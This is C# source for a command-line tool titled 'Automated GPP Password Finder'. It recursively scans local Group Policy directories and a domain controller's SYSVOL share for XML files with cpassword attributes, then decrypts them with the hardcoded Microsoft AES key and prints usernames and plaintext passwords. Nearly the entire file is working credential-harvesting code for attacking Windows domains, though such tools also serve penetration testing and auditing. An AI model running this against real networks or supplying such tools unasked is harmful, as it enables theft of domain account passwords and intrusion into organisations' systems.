using System;
using System.Collections.Generic;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace GppAutomatic
{
    class Program
    {
        const string AUTO_MODE = "auto";
        const string LOCAL_MODE = "local";
        const string DC_MODE = "dc=";
        const string DIR_ARG = "dir=";
        const string FILE_ARG = "file=";
        const string PASS_ARG = "pass=";

        private static bool bDebug = false;

        static void Main(string[] args)
        {
            Console.WriteLine("**********************************************");
            Console.WriteLine("*  Welcome to Automated GPP Password Finder  *");
            Console.WriteLine("*            Created By mitm                 *");
            Console.WriteLine("**********************************************\n");

            #region Usage

            if (args.Length == 0 || args[0] == "-h" || args[0] == "-H" || args[0] == "/h" || args[0] == "/H" || args[0] == "-?" || args[0] == "/?")
            {
                string strExe = AppDomain.CurrentDomain.FriendlyName;
                Console.WriteLine("Usage: " + strExe + " <Mode> [-v]");
                Console.WriteLine("use -v for verbose");
                Console.WriteLine("\nModes:");

                Console.WriteLine("\n    Automatic Mode: Scan Local Directories And DC SYSVOL");
                Console.WriteLine("            Usage: " + strExe + " " + AUTO_MODE);

                Console.WriteLine("\n    Local Scan: Scan Only Local Directories (skip DC SYSVOL scan)");
                Console.WriteLine("            Usage: " + strExe + " " + LOCAL_MODE);

                Console.WriteLine("\n    Custom DC Scan: Scan Only DC (skip Local Scan scan)");
                Console.WriteLine("            Usage: " + strExe + " " + DC_MODE + "<DC Name>  (leave name empty to automatic DC detection");

                Console.WriteLine("\n    Directory Scan: Scan Spesific Directory (skip Local and DC SYSVOL scan)");
                Console.WriteLine("            Usage: " + strExe + " " + DIR_ARG + "<Directory Path>");

                Console.WriteLine("\n    File Scan: Scan Spesific File (skip Local and DC SYSVOL scan)");
                Console.WriteLine("            Usage: " + strExe + " " + FILE_ARG + "<File Path>");

                Console.WriteLine("\n    Password Deycrpt: Decrypt Spesific Base64 password (from cpassword parameter)");
                Console.WriteLine("            Usage: " + strExe + " " + PASS_ARG + "<base64 Password>");

                Console.WriteLine("\nExamples:");
                Console.WriteLine("\n    " + strExe + " " + AUTO_MODE);
                Console.WriteLine("    " + strExe + " " + LOCAL_MODE);
                Console.WriteLine("    " + strExe + " " + DC_MODE);
                Console.WriteLine("    " + strExe + " " + DC_MODE + "MyDC");
                Console.WriteLine("    " + strExe + " " + DIR_ARG + "C:\\Temp\\AllPolicies");
                Console.WriteLine("    " + strExe + " " + FILE_ARG + "C:\\Temp\\AllPolicies\\Groups.xml");
                Console.WriteLine("    " + strExe + " " + PASS_ARG + "1dLl2PMSed1A9KZn/hQgrg");

                Console.WriteLine("");
                Environment.Exit(0);
            }

            #endregion

            if (args.Length > 1 && args[1].ToLower() == "-v")
                bDebug = true;

            #region Modes

            string strArg = args[0];
            string strLowArg = args[0].ToLower();
            if (strLowArg.StartsWith(AUTO_MODE))
            {
                Console.WriteLine("[*] Automatic Mode");
                ScanLocal();
                string strDC = FindDC();
                ScanDC(strDC);
            }
            else if (strLowArg.StartsWith(LOCAL_MODE))
            {
                Console.WriteLine("[*] Local Mode");
                ScanLocal();
            }
            else if (strLowArg.StartsWith(DC_MODE))
            {
                Console.WriteLine("[*] DC Mode");

                string strDC = strArg.Remove(0, DC_MODE.Length);
                if (strDC == "")
                    strDC = FindDC();
                ScanDC(strDC);
            }
            else if (strLowArg.StartsWith(DIR_ARG))
            {
                Console.WriteLine("[*] Directory Mode");
                ScanDirectory(strArg.Remove(0, DIR_ARG.Length));
            }
            else if (strLowArg.StartsWith(FILE_ARG))
            {
                Console.WriteLine("[*] File Mode");
                ScanFile(strArg.Remove(0, FILE_ARG.Length));
            }
            else if (strLowArg.StartsWith(PASS_ARG))
            {
                Console.WriteLine("[*] Password Mode");
                Console.WriteLine("[*] Password is: " + DeycrptGPP_Password(strArg.Remove(0, PASS_ARG.Length)));
            }
            else
            {
                Console.WriteLine("Unknown Argument");
            }

            #endregion
        }

        private static void ScanDC(string strDC)
        {
            ScanDirectory("\\\\" + strDC + "\\SYSVOL");
        }

        private static string FindDC()
        {
            string strDC = Environment.GetEnvironmentVariable("LogonServer");
            if (strDC.StartsWith("\\\\")) strDC = strDC.Substring(2);
            DebugLog("DC is: " + strDC);
            return strDC;
        }

        private static void ScanLocal()
        {            
            ScanDirectory(Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\sysvol");
            ScanDirectory(Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\system32\\GroupPolicy");
            ScanDirectory(Environment.GetEnvironmentVariable("ALLUSERSPROFILE") + "\\Application Data\\Microsoft\\Group Policy");
        }

        private static void DebugLog(string strLine)
        {
            if (bDebug)
            {
                Console.WriteLine("[*] " + strLine);
            }
        }

        private static void ScanDirectory(string strDir)
        {
            DebugLog("Scanning Directory - " + strDir);

            if (!Directory.Exists(strDir))
            {
                Console.WriteLine("[*] Directory " + strDir + " Not Found");
            }
            else
            {
                try
                {
                    foreach (string strCurrFile in Directory.GetFiles(strDir))
                    {
                        if (strCurrFile.ToLower().EndsWith(".xml"))
                        {
                            try
                            {
                                ScanFile(strCurrFile);
                            }
                            catch (Exception ex)
                            {
                                DebugLog("Error parsing file - " + strCurrFile + " - " + ex.Message);
                            }
                        }
                    }

                    foreach (string strSubDir in Directory.GetDirectories(strDir))
                    {
                        try
                        {
                            ScanDirectory(strSubDir);
                        }
                        catch (Exception ex)
                        {
                            DebugLog("Error parsing Folder - " + strSubDir + " - " + ex.Message);
                        }
                    }
                }
                catch (Exception ex)
                {
                    DebugLog("Error parsing Folder - " + strDir + " - " + ex.Message);
                }
            }
        }

        private static void ScanFile(string strFile)
        {
            DebugLog("Scanning File - " + strFile);
            FileStream fs = new FileStream(strFile, FileMode.Open, FileAccess.Read, FileShare.Read);
            StreamReader sr = new StreamReader(strFile);

            // Scan File
            string strCurrLine = sr.ReadLine();

            while (strCurrLine != null)
            {
                // Find Pass
                string strPass = GetParamValue(strCurrLine, "cpassword");
                if (strPass != "")
                {
                    // Find User Name
                    string strUserName = GetParamValue(strCurrLine, "userName");
                    if (strUserName == "") strUserName = GetParamValue(strCurrLine, "accountName");
                    if (strUserName == "") strUserName = GetParamValue(strCurrLine, "username");
                    if (strUserName == "") strUserName = GetParamValue(strCurrLine, "runAs");
                    if (strUserName == "") strUserName = "[User Name Not Found]";

                    // Find New User Name
                    string strNewName = GetParamValue(strCurrLine, "newName");

                    // Print result
                    Console.WriteLine("-----------------------------------------------------------------");
                    Console.WriteLine("[*] Found Password in file " + strFile);
                    Console.WriteLine("[*] User Name is: " + strUserName);
                    if (strNewName != "")
                        Console.WriteLine("[*] New User Name is: " + strNewName);
                    Console.WriteLine("[*] Encrypted Password is: " + strPass);

                    try
                    {
                        string strClearPass = DeycrptGPP_Password(strPass);
                        Console.WriteLine("[*] Password is: " + strClearPass);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[*] ERROR while decrypt password - " + ex.Message);
                    }
                    Console.WriteLine("-----------------------------------------------------------------");
                }
                strCurrLine = sr.ReadLine();
            }
        }

        private static string GetParamValue(string strLine, string strParamName)
        {
            strParamName += "=\"";
            int nIndex = strLine.IndexOf(strParamName);
            if (nIndex >= 0)
            {
                string strTmp = strLine.Substring(nIndex + strParamName.Length);
                int nEndIndex = strTmp.IndexOf('"');
                if (nEndIndex >= 0)
                {
                    return strTmp.Substring(0, nEndIndex);
                }
                else
                {
                    return strTmp;
                }
            }
            else
            {
                // No Param Found
                return "";
            }
        }

        static string DeycrptGPP_Password(string strBase64Pass)
        {
            // From MSDN: msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
            byte[] MSKey = {0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc,
                                     0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b};
            byte[] NullIVs = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

            // Padding
            strBase64Pass = strBase64Pass.PadRight(strBase64Pass.Length + (4 - (strBase64Pass.Length % 4)), '=');

            byte[] passData = Convert.FromBase64String(strBase64Pass);

            Aes myAes = Aes.Create();
            ICryptoTransform decryptor = myAes.CreateDecryptor(MSKey, NullIVs);
            MemoryStream input = new MemoryStream(passData);
            CryptoStream output = new CryptoStream(input, decryptor, CryptoStreamMode.Read);
            StreamReader sr = new StreamReader(output);
            string strPass = sr.ReadToEnd();

            return Encoding.Unicode.GetString(Encoding.Default.GetBytes(strPass));
        }
    }
}
